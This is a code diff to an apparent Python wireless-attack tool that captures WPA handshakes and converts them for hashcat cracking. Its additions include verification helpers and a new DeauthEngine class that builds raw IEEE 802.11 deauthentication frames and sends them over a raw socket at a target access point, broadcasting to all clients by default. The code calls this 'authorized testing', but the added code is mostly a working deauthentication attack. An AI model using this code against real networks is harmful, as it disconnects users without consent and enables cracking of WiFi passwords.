@@ -52,6 +52,15 @@ class HandshakeCapturer:
         self.wordlist_path = None
         self.ai_engine = None
         
+        # Capture timeout in seconds
+        self.capture_timeout = 120
+        
+        # Capturing state flag
+        self.is_capturing = False
+        
+        # Active processes list for cleanup
+        self.active_processes = []
+        
         # Capture statistics
         self.packets_captured = 0
         self.eapol_packets = 0
@@ -1111,6 +1120,15 @@ class HandshakeCapturer:
         """Stop ongoing capture"""
         self.running = False
         
+        # Clean up all active processes
+        for proc in self.active_processes:
+            try:
+                if proc.poll() is None:  # Process is still running
+                    proc.terminate()
+            except:
+                pass
+        self.active_processes.clear()
+        
         if self.capture_process:
             try:
                 self.capture_process.terminate()
@@ -1129,6 +1147,43 @@ class HandshakeCapturer:
                 self.deauth_process.terminate()
             except:
                 pass
+
+    def stop(self):
+        """Alias for stop_capture - used in tests"""
+        self.stop_capture()
+    
+    def verify_handshake(self, pcap_file: str) -> bool:
+        """
+        Public method to verify handshake - wrapper for _verify_handshake
+        
+        Args:
+            pcap_file: Path to the pcap file
+            
+        Returns:
+            bool: True if handshake is present
+        """
+        return self._verify_handshake(pcap_file)
+    
+    def _verify_handshake(self, pcap_file: str) -> bool:
+        """
+        Verify if a pcap file contains a valid handshake
+        
+        Args:
+            pcap_file: Path to the pcap file
+            
+        Returns:
+            bool: True if handshake is present
+        """
+        if not os.path.exists(pcap_file):
+            return False
+        
+        # Check for EAPOL packets in the file
+        try:
+            with open(pcap_file, 'rb') as f:
+                content = f.read()
+                return self.eapol_pattern.search(content) is not None
+        except:
+            return False
     
     def _convert_to_hccapx(self):
         """Convert pcap to HCCAPX format for hashcat"""
@@ -1291,6 +1346,130 @@ class HandshakeCapturer:
             })
         
         return sorted(captures, key=lambda x: x['created'], reverse=True)
+
+    def _get_capture_path(self, network_name: str) -> str:
+        """Generate capture file path for a given network name"""
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        safe_name = re.sub(r'[^a-zA-Z0-9_-]', '_', network_name)
+        filename = f"{safe_name}_{timestamp}.pcap"
+        # Ensure capture_dir is a Path object
+        if isinstance(self.capture_dir, str):
+            return str(Path(self.capture_dir) / filename)
+        return str(self.capture_dir / filename)
+
+    def _validate_mac_address(self, mac: str) -> bool:
+        """Validate MAC address format"""
+        mac_pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
+        if not mac_pattern.match(mac):
+            raise ValueError(f"Invalid MAC address format: {mac}")
+        return True
+
+
+class DeauthEngine:
+    """
+    Professional Deauthentication Engine
+    Builds and sends deauthentication frames for authorized testing
+    """
+    
+    def __init__(self):
+        self.platform = platform.system()
+        self.interface = None
+        
+    def build_deauth_frame(self, bssid: str, client_mac: str) -> bytes:
+        """
+        Build a deauthentication frame
+        
+        Args:
+            bssid: Target access point MAC address
+            client_mac: Client MAC address (use FF:FF:FF:FF:FF:FF for broadcast)
+            
+        Returns:
+            bytes: Raw deauthentication frame
+        """
+        # Convert MAC addresses to bytes
+        def mac_to_bytes(mac):
+            return bytes.fromhex(mac.replace(':', '').replace('-', ''))
+        
+        bssid_bytes = mac_to_bytes(bssid)
+        client_bytes = mac_to_bytes(client_mac)
+        
+        # Deauthentication frame structure (IEEE 802.11)
+        # Frame Control (2 bytes) - Deauth is type 0xC0
+        frame_control = struct.pack('<H', 0xC000)
+        
+        # Duration (2 bytes)
+        duration = struct.pack('<H', 0x0000)
+        
+        # Destination Address (6 bytes)
+        dest_addr = client_bytes
+        
+        # Source Address (6 bytes)
+        source_addr = bssid_bytes
+        
+        # BSSID (6 bytes)
+        bssid_addr = bssid_bytes
+        
+        # Sequence Control (2 bytes)
+        seq_control = struct.pack('<H', 0x0000)
+        
+        # Reason Code (2 bytes) - 0x0003 = Deauthenticated because sending STA is leaving
+        reason_code = struct.pack('<H', 0x0003)
+        
+        # Build the frame
+        frame = (
+            frame_control +
+            duration +
+            dest_addr +
+            source_addr +
+            bssid_addr +
+            seq_control +
+            reason_code
+        )
+        
+        return frame
+    
+    def send_deauth(self, interface: str, bssid: str, client_mac: str = 'FF:FF:FF:FF:FF:FF', 
+                    count: int = 10, delay: float = 0.1) -> int:
+        """
+        Send deauthentication frames
+        
+        Args:
+            interface: Network interface to use
+            bssid: Target AP MAC address
+            client_mac: Client MAC (broadcast by default)
+            count: Number of frames to send
+            delay: Delay between frames in seconds
+            
+        Returns:
+            int: Number of frames sent successfully
+        """
+        if self.platform != 'Linux':
+            print(f"Deauth attack only supported on Linux (current: {self.platform})")
+            return 0
+        
+        frame = self.build_deauth_frame(bssid, client_mac)
+        sent = 0
+        
+        try:
+            # Create raw socket
+            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
+            sock.bind((interface, 0))
+            
+            for i in range(count):
+                try:
+                    sock.send(frame)
+                    sent += 1
+                    time.sleep(delay)
+                except Exception as e:
+                    print(f"Error sending frame {i}: {e}")
+                    break
+                    
+            sock.close()
+        except Exception as e:
+            print(f"Failed to create socket: {e}")
+            return 0
+            
+        return sent
 
 
 if __name__ == "__main__":
